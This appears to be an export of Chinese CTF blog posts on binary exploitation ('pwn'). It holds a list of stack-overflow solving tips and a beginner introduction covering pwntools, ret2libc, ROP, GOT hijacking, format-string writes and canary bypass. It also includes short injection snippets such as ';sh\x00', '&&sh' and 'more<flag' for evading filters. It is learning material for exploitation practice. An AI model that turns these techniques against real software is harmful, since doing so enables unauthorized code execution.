 <use xlink:href="#E1-MJMATHI-68" x="900" y="0"/>
 <use xlink:href="#E1-MJMATHI-6F" x="1476" y="0"/>
 <use xlink:href="#E1-MJMAIN-22" x="2239" y="0"/>
 <use xlink:href="#E1-MJMATHI-64" x="3018" y="0"/>
 <use xlink:href="#E1-MJMATHI-65" x="3541" y="0"/>
 <use xlink:href="#E1-MJMATHI-62" x="4008" y="0"/>
 <use xlink:href="#E1-MJMAIN-5B" x="4437" y="0"/>
 <use xlink:href="#E1-MJMATHI-61" x="4716" y="0"/>
 <use xlink:href="#E1-MJMATHI-72" x="5245" y="0"/>
 <use xlink:href="#E1-MJMATHI-63" x="5697" y="0"/>
 <use xlink:href="#E1-MJMATHI-68" x="6130" y="0"/>
 <use xlink:href="#E1-MJMAIN-3D" x="6984" y="0"/>
</g>
</svg>(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable<span class="hljs-string">&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br></code></pre></td></tr></table></figure>

<p>使用命令更新 Ubuntu 源列表：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">$ sudo apt update<br></code></pre></td></tr></table></figure>

<p>最后，运行下列命令在 Ubuntu 22.04 LTS 服务器中安装最新 Docker CE：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">$ sudo apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin<br></code></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>栈溢出--解题二三事</title>
    <url>/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/</url>
    <content><![CDATA[<p>1、在python中如 \x62，表示一个占一个字节的十六进制数，采用utf-8编码。</p>
<p>2、大多数程序是小端顺序，就是说输入一个数据，如果是分开输入时（比如要一个字节，一个字节的按字节分开进行输入十六进制的数，而他们本身合起来是一个具体的数，那么此时输入进去，就需要把小的值放在前面先写，大的值放后面）；而大端顺序则是大的值写前面，与平常一样的顺序写</p>
<p>因为小端顺序，就是需要从低地址往高地址填充数据，所以先输入的是会放在低地址的数，后输入的才是高地址的数</p>
<p>在Linux中LSB文件为小端顺序，MSB为大端顺序，</p>
<p>3、IDA</p>
<p>（1）F5进行反汇编</p>
<p>（2）ida 中按下F12+SHIFT，可以查看string windows，查看一些关键字符串信息</p>
<p>（3）Alt+b可以进行搜索字符串</p>
<p>（4）在反汇编窗口中，点击函数按下X，可以查看交叉引用</p>
<p>（5）TAB键可以切换汇编与伪代码</p>
<p>（6）**;** 键可以为当前指令添加全文交叉引用的注释 </p>
<p>（7）n可以定义或修改名称，通常用来标注函数名 </p>
<p>（8）g可以跳转到任意地址 </p>
<p>（9）Esc可以返回到跳转前的位置 </p>
<p>（10）D可以分别按字节、字、双字显示数据 </p>
<p>（11）A可以按 ASCII 显示数据 </p>
<p>（12）/为伪C代码添加注释</p>
<p>ida的伪代码含义：</p>
<p>sub_ 指令和子函数起点</p>
<p>locret_ 返回指令 </p>
<p>loc_ 指令</p>
<p>off_ 数据，包含偏移量</p>
<p>seg_ 数据，包含段地址值</p>
<p>asc_ 数据，ASCII字符串</p>
<p>byte_ 数据，字节（或字节数组）</p>
<p>word_ 数据，16位数据（或字数组）</p>
<p>dword_ 数据，32位数据（或双字数组）</p>
<p>qword_ 数据，64位数据（或4字数组）</p>
<p>flt_ 浮点数据，32位（或浮点数组）</p>
<p>dbl_ 浮点数，64位（或双精度数组）</p>
<p>tbyte_ 浮点数，80位（或扩展精度浮点数）</p>
<p>stru_ 结构体(或结构体数组)</p>
<p>algn_ 对齐指示</p>
<p>unk_ 未处理字节</p>
<p>4、利用字符串程序输入溢出数据造成栈溢出的时候不要包含\x00（也就是所谓的空字符’\0’），否则向程序传入溢出数据时会造成截断</p>
<p>5、遇到不确定的地址时而最后地址的末端是我们需要到的shell的起始地址，可以填入’\x90’，对应的机器码指令是NOP(No Operation)，让CPU什么都不做，跳转到下一条命令，但是这个应用的前提是该处代码具有可执行性</p>
<p>6、在一起定义的两个全局变量，在内存的中位置是相邻的。如果一个全局变量被破坏了，不妨先查查其前后相关变量的访问代码，看看是否存在越界访问的可能。</p>
<p>7、有一个有意思的东西：在有的pwn题目中，我可以很正常的使用recvuntil()或者sendlineafter()去接收字符串，然而有的却不行；有的题目可以不用接收字符串直接输入payload（一开始认为是因为程序是在自己运行，刚好溢出点又在第一次输入的地方，所以可以），然而却碰到有些却要我接收信息才可以进行payload的输入</p>
<p>回复   ：最好是进行交互，之前可能是因为环境有些问题</p>
<p>8、遇到一个对齐的问题：关于使用system函数进行跳转出现报错的原因</p>
<p>回复：system 获得shell，是要求有栈对齐的</p>
<p>9、劫持栈帧到 .bss 段上时，要注意一下是否可能会将 .got.plt 表覆盖，导致程序无法正常执行</p>
<p>10、承接第4点吧，我们避免输入\x00导致程序截断，同时也要注意程序是否自身有着\x00，导致了截断</p>
<p>11、遇到strcat、strcpy、strcmp、strlen等函数的阻碍时，由于这些函数遇到’\0’将会停止，那么只要将其中的某个变量的第一个字符设为’\0’即可快速简单的绕过这些函数</p>
<p>12、当用puts函数泄露got表的地址，使用u64解包时，由于u64解包的条件是需要字符串的长度为8个字节，而地址的长度顶多6个字节那么长（高地址填充0，但是我们并不能接收到），此时就需要使用这样的形式进行接收：<strong>u64(p.recv(6).ljust(8,’\0’))</strong>  （’\0’写成’\x00’也行，毕竟在内存中存储情况是一样的还有**u64(p.recvuntil(‘\x7f’).ljust(8,’\x00’))**）</p>
<p>13、一个大多数人应该都有错误的认知：认为溢出只要到如gets函数就能实现溢出了，所以下面的代码就不用看，这是绝对错误的！首先，我们通过栈溢出改变的只是返回地址的内容，想要到达返回地址，整个的函数执行流必须进行完，才会发生退栈，从而利用返回地址，所以下方的代码也要处理</p>
<p>14、执行strcmp、strncmp、strcasecmp的时候，rdx 会被设置为将要被比较的字符串的长度</p>
<p>15、system的参数不一定是要/bin/sh才可以，只有sh也是可以的。而且sh可以从fflush()这个函数的名称中获取，直接查找ida或者ROPgadget –binary 文件名 –string ‘sh’查询（不一定都能成功）</p>
<p>有时候 system 参数会出现截断问题，写成<code>;sh\x00</code>，<code>||sh</code>，<code>&amp;&amp;sh</code></p>
<p>16、当远程 docker 过滤空格和 cat 时，将无法使用cat flag获取到flag，此时我们可以用<strong>more&lt;flag或者base64&lt;flag</strong>获取flag，其中的&lt;可以代替空格的功能，第一个<strong>more&lt;flag</strong> 与cat一样都是输出文件内容，而base64是把flag的内容转换成base64编码</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tacMATHJAX</span>-SSR-<span class="hljs-number">09</span>flag<br></code></pre></td></tr></table></figure>

<p>&lt;、&lt;&gt;可以代替空格</p>
<p>17、64位的文件有时候不一定会存在rbp的调用，不存在leave指令，这时候我们只需要去关注rsp的位置即可，因为ret指令代表着pop rip，把栈顶的内容弹出给rip，所以锁定rsp的位置，就可以劫持rip</p>
<p>18、有时候在我们输入时，无法通过recvuntil去卡到输入的点，可以使用sleep()函数，让线程休眠，让对面的程序跑到我们要到点，再进行输入，方可利用成功（个人猜测）</p>
<p>19、64位下的linux的系统调用号（使用syscall调用，调用号是保存到rax中,函数传参依次存入RDI,RSI,RDX,RCX,R8,R9）</p>
<p><strong>0(0x0) sys_read</strong></p>
<p><strong>1(0x1) sys_write</strong></p>
<p><strong>2(0x2)sys_open</strong></p>
<p><strong>3(0x3)sys_close</strong></p>
<p><strong>9(0x9)sys_mmap</strong></p>
<p><strong>15(0xF) sys_rt_sigreturn</strong></p>
<p><strong>37(0x25)sys_alarm</strong></p>
<p><strong>59(0x3B) sys_execve</strong></p>
<p><strong>60(0x3C)sys_exit</strong></p>
<p><strong>62(0x3E)sys_kill</strong></p>
<p>32位下linux系统调用号（使用int 80h，调用号保存在eax中，执行完函数的返回值也保存在eax里面），函数其他参数依次存入ebx，ecx，edx中</p>
<p><strong>1(0x1)sys_exit</strong></p>
<p><strong>3(0x3)sys_read</strong></p>
<p><strong>4(0x4)sys_write</strong></p>
<p><strong>5(0x5)sys_open(文件名,0,0)</strong></p>
<p><strong>11(0xB) sys_execve</strong> </p>
<p>20、使用<strong>execve</strong>获取shell时，其参数要设置为<code>execve(&quot;/bin/sh&quot;,0,0)</code></p>
<p>21、劫持rip时，如果觉得在ida中的栈查看覆盖偏移量是对的，却没能获取shell时，去看看汇编代码，可能这时候出题人故意设置了返回代码不是平常的 leave  ret这两个，被修改为其他的代码了，导致退栈时候rsp指向地方的不是在rbp的下面，这时候我们要去gdb里面下断点在返回的指令前，查看rbp具体指向的地方</p>
<p>22、<strong>gdb 文件名 core</strong>可以调试程序中断而生成的核心转储文件，进行深入查看中断原因 </p>
<p>23、当题目已给出libc时，可以直接用libc显示出函数在其内的偏移地址，命令格式如下：（也可以直接调用libc文件，libc = ELF(“./文件名”)）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">objdump -T ./libc-2.23.so | grep system #显示system的libc地址<br></code></pre></td></tr></table></figure>

<p><img src="/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/QQ%E5%9B%BE%E7%89%8720210510214657.png"></p>
<p>24、静态链接题目多半考虑 ret2syscall，或者看有没有 mprotect 函数，修改段的执行权限，注入shellcode</p>
<p>25、libc 中 environ 存储了栈上环境变量的特性，可以利用这个特效来泄露出栈上的地址，脚本写为 libc.sym[“environ”]</p>
<p>26、scanf 读取过长的输入时会使用 malloc_hook 分配 chunk，也就是如果能修改__malloc_hook为one_gadget的话，就能getshell</p>
<p>27、got表劫持：常见劫持put(buf)、free(buf)、atoi(buf)、atol(buf)、strlen(buf)</p>
<p>28、当scanf的参数不是%s时候，是u，d等数字，输入数字是使用str()即可，不用p64()。</p>
<p>因为输入数字是就是使用数字输入，如果使用了p64()将会变成二进制数，例如字符’1’实际上是二进制的0x31</p>
<p>29、使用execv(“/bin/sh”, 0)getshell需要两个参数,比execve少一个</p>
<p>另外：2.29之后的libc直接调用system可能会出问题，但是劫持__free_hook为system没问题</p>
<p>30、碰到静态编译的题目时，有两种方法：</p>
<ul>
<li><p>使用ROPgadget内置的功能，可以自动生成rop链，调用系统函数getshell，命令：</p>
<p><code>ROPgadget --binary 文件名 --ropchain</code></p>
</li>
<li><p>使用mprotect函数修改.bss段执行权限，把shellcode写入.bss段中执行而getshell</p>
</li>
</ul>
<p>31、格式化字符串漏洞：当要往某个地址上写入地址时，格式为：目标addr + ‘%’ + str(addr - 已写的长度) + “c%a(a是偏移量)$hn” 这边一般使用hn写两个字节，或者hhn写一个字节，这样不容易造成timeout，当然前提是格式化漏洞给的长度够长</p>
<p>已写长度：printf打印出来的字符长度，地址数值大的写后面（就能直接减去前面已经写的偏移量）</p>
<p>64位，因为地址必定含有’\x00’，会产生截断，所以往目标地址写入值，要把地址放在最后面，不然打印的字符被截断，n就没办法发生作用                                                                                                                                                                            </p>
<p>32、对于劫持rip的理解：首先我们传递给rip的是某个地址，其次这个地址指向的是一段有可执行权限的地址，最后这个地址上存在着指令（机器码）rop就是还需要ret来衔接进行不断地更换rip的值</p>
<p>33、linux中，程序在加载的时候，会依次调用<code>init.array</code>数组中的每一个函数指针；在结束的时候，依次调用<code>fini.array</code>中的每一个函数指针。一般用在当程序出现格式化字符串漏洞，但是至少需要写两次才能完成攻击。</p>
<ul>
<li>可以考虑改写<code>fini.array</code>中的函数指针为<code>main</code>函数地址，可以再执行一次<code>main</code>函数。（或者在格式化字符串漏洞后面存在有其他函数的调用，也可以考虑修改这个函数的got表）</li>
<li>一般来说，这个数组的长度为1，也就是说只能写一个地址</li>
</ul>
<p>获取fini.array地址有两种方式：1、<code>fini_array = elf.sym[&quot;__init_array_end&quot;]</code>   2、使用<code>readelf -s 文件名</code>命令去查找<code>__init_array_end</code>的地址</p>
<p>34、如果把0x80000000赋值给a，而a = -a，那么a还是等于0x80000000</p>
<p>35、用libc寻找字符串/bin/sh地址，写为binsh = libc_base + next(libc.search(b’/bin/sh’))</p>
<p>36、scanf(buf,buf)，如果是以这样的形式出现输入，因为第一个buf是格式化字符串，scanf使用了我们的输入作为格式化字符串，因此会存在格式化字符串漏洞，计算偏移需要通过gdb调试（必须在相应的版本下调试）</p>
<p>%n$s（n是偏移，s是输入的形式以字符串，所以我们输入的地方是以偏移点作为指针输入的）</p>
<p>37、当程序存在close(1)以及close(2)：代表关闭了linux里面的标准输出(1)和标准错误(2)，所以即使已经getshell了，我们是看不到输出的，所以这时候输入<code>exec 1&gt;&amp;0</code>就可以让标准输出的文件描述符重定向为0，而0没被关闭（0，1，2是默认开启的），才能看到输出</p>
<p>38、glibc版本仅限于libc-2.26及以下：当flag保存在栈上、bss等地方时，可以通过修改栈上main函数的argv[0]（文件路径），改为flag的地址，然后<code>stack_chk_fail</code>会打印环境变量的第一个值，即可打印出flag，高版本增加了限制，不会再打印出文件路径</p>
<p>39、当遇到一些题目需要在shellcode前面加上’\x00’才能绕过时，因为’\x00’是会影响到shellcode解析的，所以要让’\x00’凑成有意义的指令却又不能影响到shellcode（底下的机器码在32位和64位中都是一样的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">00 40 00                 add    BYTE PTR [rax+0x0],  al<br>00 41 00                 add    BYTE PTR [rcx+0x0],  al<br>00 42 00                 add    BYTE PTR [rdx+0x0],  al<br>00 43 00                 add    BYTE PTR [rbx+0x0],  al<br>00 45 00                 add    BYTE PTR [rbp+0x0],  al<br>00 46 00                 add    BYTE PTR [rsi+0x0],  al<br>00 47 00                 add    BYTE PTR [rdi+0x0],  al<br></code></pre></td></tr></table></figure>

<p>40、栈题的调试一直都不知道怎么才能准确的停止在某个地方，现在终于知道了</p>
<p><img src="/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/pwny1.jpg"><span class="image-caption">img</span></p>
<p>在上面的gdb.attach(p)就是运行脚本到此位置时打开gdb调试，然后在gdb框中输入c，就会运行到pause()处，然后我们就可以进行调试。这样就能准确的停在你想要的位置</p>
<p>41、mprotect修改内存权限的第一个参数必须是起始地址，修改的长度必须是页的倍数</p>
<p>42、<em><em>int snprintf(char</em> dest_str, size_t size, const char</em> format,…);**</p>
<p>将可变个参数(…)按照format格式化成字符串，然后将其复制到str中。返回值为欲写入的字符串长度</p>
<p>这个函数有个漏洞，因为返回值是欲写入的字符串长度，也就是说，被复制的字符串很长，又能被加载（比如%s）那返回值就可能很大，如果以这个作为某种输入的值就有产生溢出</p>
<p>43、系统是通过 cs 段寄存器来判断程序是64位还是32位，cs == 0x23代表32位模式，cs == 0x33代表64位模式，而cs寄存器可以通过<code>retfq</code>汇编指令来修改</p>
<p>retfq有两步操作：<code>ret以及set cs</code>，执行retfq会跳转到 rsp 同时将cs设置为[rsp+0x8]，我们只需要事先在ret位置写入32位的shellcode就可以执行了，但是这里有一点需要注意的是，retfq跳转过去的时候程序已经切换成了32位模式，所以地址解析也是以32位的规则来的，所以如原先的<code>rsp = 0x7ffe530d01b8</code>会被解析成<code>esp = 0x530d01b8</code></p>
<p>44、在大多数libc中 read 与 write 的 symbols 只有一个字节不同，所以在一类没有泄露函数的栈题目中，可以考虑覆盖read的got表的最后一字节，变成write从而泄露libc</p>
<p>45、如果got表可改，有种思路是可以修改某个函数，让他指向syscall，在有的函数这种偏移仅仅只需要更改最后一字节即可。</p>
<p>46、在Linux下，有一种线程局部存储（Thread Local Storage）机制，简称TLS。它主要存储着一个线程的一些全局变量，其中包括<code>uintptr_t stack_guard</code>，我们熟知的canary来源于此，因此可以修改<code>uintptr_t stack_guard</code>，来绕过canary。这种方法可以避免有时候打印函数使用printf、puts，而出现’\x00’字节截断无法泄露canary，但却需要有次任意写才能进行修改。</p>
<p>输入tls， 可以找到其地址。</p>
<p><img src="/2020/11/22/2020-11-22-%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%A7%A3%E9%A2%98%E4%BA%8C%E4%B8%89%E4%BA%8B/image-20220901214930484.png"><span class="image-caption">image-20220901214930484</span></p>
<p>47、Linux 下存在像<code>gettimeofday</code>（获取当前时间）的系统调用，但又只进行读取数据这种较为安全的操作。因此将其直接映射到用户空间上，像这种 Linux 内核在用户空间映射一个包含一些变量及一些系统调用的实现的内存页被称为<code>vsyscall</code>。而<code>vsyscall</code>可以简单看作是一个<code>ret </code> </p>
<p>其中一个的固定地址为<code>0xFFFFFFFFFF600000</code>，不受 ASLR 影响，可以稳定调用。</p>
<p>48、非预期：有些可以进入到远程环境的内核题目，可以利用 gcc 命令编译 flag 文件，然后会因为报错而输出 flag 文件内容。</p>
]]></content>
  </entry>
  <entry>
    <title>初入PWN</title>
    <url>/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/</url>
    <content><![CDATA[<p>前提工具配置：</p>
<p>（1）Linux系统虚拟机：配置python3 、安装pwntools的pwn模块、安装gdb、安装pip（其他的工具在做题遇到时再去安装）</p>
<p>（2）本机IDA pro静态调试器和Ollydbg动态调式器（两个都要有32bit以及64bit的版本）</p>
<p>语法要求：</p>
<p>（1）汇编语法</p>
<p>（2）c语言（c++最好也掌握，不过这比较少见）</p>
<p>（3）python</p>
<p>（4）java（后面的补充学习，新手没必要学）</p>
<p>工具使用要求：</p>
<p>（1）学会IDA的静态调试</p>
<p>（2）学会gdb的动态调试</p>
<p>（3）pwntools的使用</p>
<p>​    ·······</p>
<p>一、PWN模块中用到的函数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>send(data)</td>
<td>发送数据（字符串形式发送）</td>
</tr>
<tr>
<td>sendline(data)</td>
<td>发送一行数据，默认在行尾加 \n（字符串形式发送）</td>
</tr>
<tr>
<td>recv(numb=1096,timeout=default)</td>
<td>接收指定字节数的数据</td>
</tr>
<tr>
<td>buf = p.recvuntil(“\n”, drop=True)</td>
<td>直到接收到\n为止，drop=True表示丢弃括号里的内容，buf为接收到的输出但不包括丢弃的\n</td>
</tr>
<tr>
<td>recvrepeat(timeout=default)</td>
<td>接收数据直到 EOF 或 timeout</td>
</tr>
<tr>
<td>recvall()</td>
<td>接收数据直到 EOF</td>
</tr>
<tr>
<td>recvline(keepends=True)</td>
<td>接收一行，可选择是否保留行尾的 \n</td>
</tr>
<tr>
<td>listen(端口)</td>
<td>开启一个本地的监听端口</td>
</tr>
<tr>
<td>remote(‘IP地址’, 端口)</td>
<td>与目标IP建立一个套接字管道与之远程交互（在线的）</td>
</tr>
<tr>
<td>interactive()</td>
<td>可同时读写管道，相当于回到 shell 模式进行交互，在取得 shell 之后调用</td>
</tr>
<tr>
<td>p8() p16()   p32()   p64()</td>
<td>把括号内数据打包成8位/16位/32位/64位的二进制数</td>
</tr>
<tr>
<td>u8() u16()  u32()   u64()</td>
<td>把括号内字符串解包成二进制数</td>
</tr>
<tr>
<td>process(‘文件路径’)，p = process(argv=[‘./vuln’, payload])</td>
<td>与本地文件建立一个交互通道，可传递参数</td>
</tr>
<tr>
<td>sendlineafter(“string”,payload)</td>
<td>接收到string后发送payload</td>
</tr>
<tr>
<td>close()</td>
<td>关闭交互的通道</td>
</tr>
<tr>
<td>ELF(‘文件路径’)</td>
<td>获取文件对象或者libc库对象</td>
</tr>
<tr>
<td>plt[‘函数名’]</td>
<td>获取函数在PLT表中的地址</td>
</tr>
<tr>
<td>got[‘函数名’]</td>
<td>获取函数在GOT表中的地址</td>
</tr>
<tr>
<td>symbols[‘函数名’]<br>或sym[‘函数名’]</td>
<td>获取函数plt地址，用在libc里面就是获取libc里的偏移地址</td>
</tr>
<tr>
<td>asm(“汇编指令”)</td>
<td>把汇编指令转换成对应的机器码，机器码是以字符串形式返回</td>
</tr>
<tr>
<td>bss(offset)</td>
<td>返回 .bss 段加上 offset 后的地址</td>
</tr>
<tr>
<td>asm(shellcraft.amd64.linux.sh()，arch=’amd64’)（这里是指明x64环境，如果已经有context设置环境就直接写为asm(shellcraft.sh())）</td>
<td>生成shellcode,一般与asm进行联用，转为对应机器码</td>
</tr>
<tr>
<td>context(arch=’amd64’或‘i386’,os=’linux’,log_level=’debug’)</td>
<td>设置环境</td>
</tr>
<tr>
<td>gdb.attach(p,’b* main’)</td>
<td>调动gdb进行脚本调式</td>
</tr>
<tr>
<td>shutdown(‘in’)</td>
<td>参数为in/read/recv时关闭输出流，参数为out/write/send关闭输入流</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h3 id="一、x86架构下的栈溢出"><a href="#一、x86架构下的栈溢出" class="headerlink" title="一、x86架构下的栈溢出"></a>一、x86架构下的栈溢出</h3><p>栈区：简单来说就是c语言中创建的局部变量（例如函数花括号里的变量）的存储位置。内存中的栈区指的是系统栈，由系统自动维护。</p>
<p>栈在程序加载进内存后就会出现</p>
<p>入栈：每个函数都有一个属于自己的栈帧空间，最先压入栈内的是函数的返回地址（用来返回到下一条指令），之后是函数的基地址、参数入栈。例如主调函数在调用函数a时，主调函数先存入自身栈帧的为返回地址、自身基地址、传入函数a的实参（如果有的话），然后替函数a创建一个新栈帧，在新栈帧中先压入函数a的返回地址（为了函数调用结束时，可以返回到下一条指令继续程序），再压入主调函数的基地址（函数调用结束时，返回到主调函数的基地址）以及函数a中的局部变量。此时是高地址往低地址生长（主调函数在的位置为高地址）</p>
<p>退栈：而函数调用结束，则与调用时相反，先从被调函数的局部变量开始直接弹出栈，栈顶指向存储着被调函数基地址（存储主调函数基地址），被调函数基地址被弹出后，释放出主调函数的基地址给ebp，然后将返回地址弹出交给eip去执行，之后便返回到下一条指令的地址（这里举例为主调函数直接调用一个函数，如果层层嵌套，则先会返回到上一个主调函数的栈帧），继续程序的运行，ebp指向此刻的主调函数的基地址</p>
<p>系统中当前正在运行的函数总是在栈顶</p>
<p>与函数状态相关的主要寄存器：esp，ebp，eip：</p>
<p>（1）esp：栈指针寄存器，存放一个指针，该指针永远指向系统栈正在运行的栈帧的栈顶（存储函数调用栈的栈顶地址），在压栈和退栈时发生变化</p>
<p>（2）ebp：基地址指针寄存器，该指针永远指向系统栈正在运行的栈帧的底部，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置 </p>
<p>（3）在esp和ebp之间的内存空间为当前栈帧</p>
<p>（4）eip：用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令</p>
<p>因此，所谓的栈溢出漏洞，就是利用一些危险函数进行读取远超一个变量所需的数值，覆盖到相邻栈中的数值，从而修改相邻栈中的变量的值，往这些修改的值中注入我们所需要的跳转的例如shellcode，函数地址等，使程序崩坏或是让程序执行一些我们想要执行的程序，达到破坏的目的</p>
<p>x86下的CPU包含的8个四字节的通用寄存器：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/271639137915732.jpg"></p>
<p>寄存器使用约定：寄存器eax、edx和ecx为主调函数保存寄存器(caller-saved registers)，当函数调用时，若主调函数希望保持这些寄存器的值，则必须在调用前显式地将其保存在栈中；被调函数可以覆盖这些寄存器，而不会破坏主调函数所需的数据。寄存器ebx、esi和edi为被调函数保存寄存器(callee-saved registers)，即被调函数在覆盖这些寄存器的值时，必须先将寄存器原值压入栈中保存起来，并在函数返回前从栈中恢复其原值，因为主调函数可能也在使用这些寄存器。此外，被调函数必须保持寄存器ebp和esp，并在函数返回后将其恢复到调用前的值，亦即必须恢复主调函数的栈帧。</p>
<h3 id="return-to-libc"><a href="#return-to-libc" class="headerlink" title="return to libc"></a><strong>return to libc</strong></h3><h4 id="——构造system-“-bin-sh“"><a href="#——构造system-“-bin-sh“" class="headerlink" title="——构造system(“/bin/sh“)"></a>——构造system(“/bin/sh“)</h4><p>使用前提：ASLR被关闭，内存中存在可达到目的的特定函数</p>
<p>system地址：<strong>在ASLR 被关闭的前提下</strong>，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态链接库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
<p>/bin/sh字符串地址：可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过getenv() 等函数来确定地址。</p>
<h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP ( Return Oriented Programming )"></a><strong>ROP ( Return Oriented Programming )</strong></h3><h4 id="——修改返回地址，让其指向内存中已有的一段指令"><a href="#——修改返回地址，让其指向内存中已有的一段指令" class="headerlink" title="——修改返回地址，让其指向内存中已有的一段指令"></a>——修改返回地址，让其指向内存中已有的一段指令</h4><p>利用一个及以上的gadget执行指令，最终调用能修改权限的函数，例如编号为125的函数mprotect()可修改栈的属性，从而利用shellcode。若是要连续使用多个gadget时一定要找含有ret指令的片段</p>
<p>被调用函数的编号应存入 eax，调用参数应按顺序存入 ebx，ecx，edx，esi，edi 中</p>
<p>那么如果要调用函数，就需要参数，而参数被存入在上方列举的寄存器中，那么此时我们要做的就是向寄存器存入我们需要的参数 ：</p>
<p>1）如果在内存中已经存在我们要的数据，可用mov指令来存入 </p>
<p>2）用pop指令来将栈顶数据弹入寄存器，pop 所传输的数据应该在 gadget 地址之后，如图：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/v2-07a48918aeb2f8b7dd2ddc4836a7b773_720w.png"></p>
<p>我们可以使用 push esp 这个gadget来执行shellcode</p>
<p>对于所有包含 pop 指令的 gadget，在其gadget地址之后都要添加 需要pop传入寄存器的数据，同时在所有 gadget 最后包含一段shellcode</p>
<p>如果利用 gadget 读取 ebp 的值再加上某个合适的数值，就可以保证溢出数据都具有可执行权限，这样就不再需要获取确切地址，也就具有了<strong>绕过内存随机化（ALSR）</strong>的可能。</p>
<h3 id="Hijack-GOT"><a href="#Hijack-GOT" class="headerlink" title="Hijack GOT"></a><strong>Hijack GOT</strong></h3><h4 id="——修改某个被调用函数的地址，让其指向另外一个函数"><a href="#——修改某个被调用函数的地址，让其指向另外一个函数" class="headerlink" title="——修改某个被调用函数的地址，让其指向另外一个函数"></a>——修改某个被调用函数的地址，让其指向另外一个函数</h4><p>该方法是直接把函数修改成我们需要的函数，不再执行原来的函数，而不是上方执行某个函数后由返回地址进行跳转</p>
<p>函数在链接库中定位所用到的外部函数会用到GOT和PLT这两张表。GOT 全称是全局偏移量表（<strong>G</strong>lobal <strong>O</strong>ffset <strong>T</strong>able），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。PLT 全称是程序链接表（<strong>P</strong>rocedure <strong>L</strong>inkage <strong>T</strong>able），用来存储外部函数的入口点（entry），换言之程序总会到 PLT 这里寻找外部函数的地址。PLT 存储在代码段（Code Segment）内，在运行之前就已经确定并且不会被修改，所以 PLT 并不会知道程序运行时动态链接库被加载的确切位置。那么 PLT 表内存储的入口点是 GOT 表中对应条目的地址。</p>
<p>程序需要调用某个外部函数时，首先到 PLT 表内寻找对应的入口点，跳转到 GOT 表中。如果这是第一次调用这个函数，程序会通过 GOT  表再次跳转回 PLT 表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉 GOT  表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过 PLT 表跳转到 GOT 表，此时 GOT  表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。</p>
<p>通过以上的介绍，那么实现修改函数的地方在于GOT表里的函数地址修改，让GOT执行的是我们需要的函数即可。既然这样，接下来需要做的工作是找到原函数的在GOT里的地址（GOT里函数的地址由PLT跳转，所以找PLT中函数的入口点）以及我们需要函数的地址，把我们需要的函数的地址替换到GOT</p>
<p>函数在动态链接库内的相对位置是<strong>固定的</strong>，在动态库打包生成时就已经确定。所以假如我们知道了某函数运行时地址（读取 GOT 表内容），也知道该函数和我们所需函数在动态链接库内的相对位置，就可以推算出函数的地址</p>
<p>最后在GOT中的替换修改，就需要用到上一个的ROP的方法实现</p>
<p>来源：</p>
<p><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/25892385">手把手教你栈溢出从入门到放弃（下）</a></p>
<h3 id="二、x64架构下的栈溢出"><a href="#二、x64架构下的栈溢出" class="headerlink" title="二、x64架构下的栈溢出"></a>二、x64架构下的栈溢出</h3><p>x64位下的十六个通用寄存器：</p>
<p><img src="/2020/11/15/2020-11-15-%E5%88%9D%E5%85%A5PWN/register.png"></p>
<p>需要补充：在gcc下编译的才是把前六个参数依次放入rdi,rsi,rdx,rcx,r8,r9，而如果在VS编译环境下的只有前四个参数依次放入rcx,rdx,r8,r9</p>
<p>gcc编译环境：在通用寄存器中，函数执行前后必须保持原始的寄存器有3个：是rbx、rbp、rsp。rx寄存器中，最后4个必须保持原值：r12、r13、r14、r15。</p>
<p>保持原值的意义是为了让当前函数有可信任的寄存器，减小在函数调用过程中的保存&amp;恢复操作。除了rbp、rsp用于特定用途外，其余5个寄存器可随意使用。</p>
